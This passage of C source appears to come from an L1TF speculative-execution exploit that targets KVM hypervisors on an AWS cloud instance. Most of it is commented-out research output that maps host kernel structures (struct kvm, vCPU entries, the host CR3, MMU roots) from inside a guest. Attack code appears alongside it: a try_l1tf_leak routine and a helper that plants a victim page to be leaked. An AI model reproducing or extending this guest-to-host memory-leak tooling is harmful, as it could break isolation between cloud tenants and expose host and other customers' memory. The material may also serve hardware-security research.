	dm         9e092018 | pa     9e092018 |       struct kvm+  18 = ffffb009c1fa8018
	dm         9e092020 | pa     9e092020 |       struct kvm+  20 = ffffb009c1fa8018
	dm         9e092028 | pa     9e092028 |       struct kvm+  28 = ffff98695e1ebc00
	dm         9e092030 | pa     9e092030 |       struct kvm+  30 = ffff98695f2a0000
	dm         9e092038 | pa     9e092038 |       struct kvm+  38 = ffff98695e900000
	dm         9e092040 | pa     9e092040 |       struct kvm+  40 = ffff98695e260000
	dm         9e092048 | pa     9e092048 |       struct kvm+  48 = ffff98695f1f0000
	dm         9e092050 | pa     9e092050 |       struct kvm+  50 = ffff98695f2d37c0
	dm         9e092058 | pa     9e092058 |       struct kvm+  58 =                0
	dm         9e092060 | pa     9e092060 |       struct kvm+  60 =                0
	dm         9e092068 | pa     9e092068 |       struct kvm+  68 =                0
	dm         9e092070 | pa     9e092070 |       struct kvm+  70 =                0
	dm         9e092078 | pa     9e092078 |       struct kvm+  78 =                0


	// Check that +0x48 and +0x50 indeed are kvm_vcpu's: there first fields should point back to struct kvm.
	reverse_after(base, 0xffff98695f1f0000-HOST_DIRECT_MAP, 0, "struct kvm_cpu", 0x8);
	reverse_after(base, 0xffff98695f2d37c0-HOST_DIRECT_MAP, 0, "struct kvm_cpu", 0x8);

	dm         9f1f0000 | pa     9f1f0000 |   struct kvm_cpu+   0 = ffffb009c1fa8000
	dm         9f2d37c0 | pa     9f2d37c0 |   struct kvm_cpu+   0 = ffffb009c1fa8000
*/


/* rain-vm-aws-c5-extra


	void try_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
	{
	assert(0 < length && length <= 64 && (phys_addr & (64-1)) + length <= 64);

		// half_spectre_start(base, phys_addr);
		half_spectre_start(base, 0x17a101f91000 + (phys_addr-0x9e177000));

========[CONFIG]========                                                                   
MACHINE:         AWS (2)                                                                                                                                                               
HELPERS:          NO (0)                                                                   
LEAK:           SKIP (1)                                                                   
========================                                                                                                                                                               
                                                                                           
                                                                                           
host_direct_map(base=9e39e218)                                                             
--------------------------------------------------------------------------------           
                                                                                           
own_vcpu(base=9e39e218, hdm=ffff9868c0000000)                                              
--------------------------------------------------------------------------------           
                                                                                           
own_task(base=9e39e218, hdm=ffff9868c0000000, vcpu=ffff98695f2137c0)                       
--------------------------------------------------------------------------------           
                                                                                                                                                                                       
host_cr3(base=9e39e218, hdm=ffff9868c0000000, task=ffff98695f1eb2a0)                       
--------------------------------------------------------------------------------                                                                                                       
                                                                                           
host_walk_tasks(base=9e39e218, hdm=ffff9868c0000000, hcr3=9e154000, task_first=ffff98695f1eb2a0)
--------------------------------------------------------------------------------           
                                                                                                                                                                                       
vcpu_via_fds(base=9e39e218, hdm=ffff9868c0000000, task=ffff987b61af9860)                   
--------------------------------------------------------------------------------           

	 * On rain-vm-aws-c5-extra:
	 * hva ffffb009c1f91000 --> pgd    1000067 pud    10b2067 pmd   ac9ca067 pte   9e177063 pa   9e177000
	 * hva ffffb009c1f91130 --> pgd    1000067 pud    10b2067 pmd   ac9ca067 pte   9e178063 pa   9e178130

	reverse_after(base, 0x9e177000, 0, "struct kvm", 0x2000);

                  0x9e39e218UL =         9e39e218
dm         9e177000 | pa     9e177000 |       struct kvm+   0 =                0
dm         9e177008 | pa     9e177008 |       struct kvm+   8 =                0
dm         9e177010 | pa     9e177010 |       struct kvm+  10 =                0
dm         9e177018 | pa     9e177018 |       struct kvm+  18 = ffffb009c1f91018
dm         9e177020 | pa     9e177020 |       struct kvm+  20 = ffffb009c1f91018
dm         9e177028 | pa     9e177028 |       struct kvm+  28 = ffff98695cb78780
dm         9e177030 | pa     9e177030 |       struct kvm+  30 = ffff98695e2a0000
dm         9e177038 | pa     9e177038 |       struct kvm+  38 = ffff98695f1a0000
dm         9e177040 | pa     9e177040 |       struct kvm+  40 = ffff98695e280000
dm         9e177048 | pa     9e177048 |       struct kvm+  48 = ffff98695f20b7c0
dm         9e177050 | pa     9e177050 |       struct kvm+  50 = ffff98695f2137c0
dm         9e177058 | pa     9e177058 |       struct kvm+  58 =                0
dm         9e177060 | pa     9e177060 |       struct kvm+  60 =                0
dm         9e177068 | pa     9e177068 |       struct kvm+  68 =                0
dm         9e177070 | pa     9e177070 |       struct kvm+  70 =                0
dm         9e177078 | pa     9e177078 |       struct kvm+  78 =                0
*/
}

void reverse_aws_struct_kvm_vcpu_arch(void)
{
/*
kvm_vcpu+0x2d8 - 0xd0 +   0:  ffff98695f1f0208   08 02 1f 5f 69 98 ff ff ..._i...
kvm_vcpu+0x2d8 - 0xd0 +   8:  ffff98695f1f0208   08 02 1f 5f 69 98 ff ff ..._i...
kvm_vcpu+0x2d8 - 0xd0 +  10:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  18:           1010000   00 00 01 01 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  20:  ffffde0200004000   00 40 00 00 02 de ff ff .@......
kvm_vcpu+0x2d8 - 0xd0 +  28:     10000ff41ffef   ef ff 41 ff 00 00 01 00 ..A.....
kvm_vcpu+0x2d8 - 0xd0 +  30:          80050033   33 00 05 80 00 00 00 00 3.......
kvm_vcpu+0x2d8 - 0xd0 +  38:                 8   08 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  40:      5dd072925740   40 57 92 72 d0 5d 00 00 @W.r.]..
kvm_vcpu+0x2d8 - 0xd0 +  48:         1150b0004   04 00 0b 15 01 00 00 00 ........ <-- unsigned long kvm_vcpu_arch.cr3
kvm_vcpu+0x2d8 - 0xd0 +  50:            7706f0   f0 06 77 00 00 00 00 00 ..w.....
kvm_vcpu+0x2d8 - 0xd0 +  58:             1078e   8e 07 01 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  60:  ffffffffff88f800   00 f8 88 ff ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 +  68:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  70:  5555555455555554   54 55 55 55 54 55 55 55 TUUUTUUU
kvm_vcpu+0x2d8 - 0xd0 +  78:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  80:               d01   01 0d 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  88:          fee00d00   00 0d e0 fe 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  90:  ffff98695e15a400   00 a4 15 5e 69 98 ff ff ...^i...
kvm_vcpu+0x2d8 - 0xd0 +  98:  ffff98695e15a400   00 a4 15 5e 69 98 ff ff ...^i...
kvm_vcpu+0x2d8 - 0xd0 +  a0:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  a8:                 1   01 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  b0:         100000000   00 00 00 00 01 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  b8:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  c0:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  c8:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  d0:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  d8:                 1   01 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  e0:             30000   00 00 03 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  e8:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  f0:             10001   01 00 01 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 +  f8:   200700600000000   00 00 00 00 06 70 00 02 .....p..
kvm_vcpu+0x2d8 - 0xd0 + 100:                4c   4c 00 00 00 00 00 00 00 L.......
kvm_vcpu+0x2d8 - 0xd0 + 108:              2005   05 20 00 00 00 00 00 00 . ......
kvm_vcpu+0x2d8 - 0xd0 + 110:  ffff98695f1f0320   20 03 1f 5f 69 98 ff ff  .._i... <-- struct kvm_mmu * kvm_vcpu_arch.mmu --> ARCH_ROOT_MMU
kvm_vcpu+0x2d8 - 0xd0 + 118:  ffffffffa60710f0   f0 10 07 a6 ff ff ff ff ........ <-- start of `struct kvm_mmu root_mmu`
kvm_vcpu+0x2d8 - 0xd0 + 120:  ffffffffa6070b90   90 0b 07 a6 ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 128:  ffffffffa607e290   90 e2 07 a6 ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 130:  ffffffffa60404d0   d0 04 04 a6 ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 138:  ffffffffa607b210   10 b2 07 a6 ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 140:  ffffffffa6071050   50 10 07 a6 ff ff ff ff P.......
kvm_vcpu+0x2d8 - 0xd0 + 148:  ffffffffa60710b0   b0 10 07 a6 ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 150:                 0   00 00 00 00 00 00 00 00 ........ <-- struct kvm_mmu_root_info root
kvm_vcpu+0x2d8 - 0xd0 + 158:          9f35f000   00 f0 35 9f 00 00 00 00 ..5..... <-- hpa_t hpa
kvm_vcpu+0x2d8 - 0xd0 + 160:                 0   00 00 00 00 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 + 168:      5cfd00003794   94 37 00 00 fd 5c 00 00 .7...\..
kvm_vcpu+0x2d8 - 0xd0 + 170:           1000404   04 04 00 01 00 00 00 00 ........
kvm_vcpu+0x2d8 - 0xd0 + 178:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 180:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 188:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 190:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 198:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
kvm_vcpu+0x2d8 - 0xd0 + 1a0:  ffffffffffffffff   ff ff ff ff ff ff ff ff ........
*/
}

void create_page_and_leak_address_and_spin_forever(void)
{
	void *vp = l1tf_spawn_leak_page();
	printf("starting l1tf_find_page_pa(%p)...\n", vp);
	for (int i = 0; i < 128; i++)
		*((char *)vp + i) = (char)i;
	*(u64 *)vp = rand64();
	printf("victim page data:\n");
	display(vp, 128);
	printf("forever idle spinning now...\n");
	while (1);
}
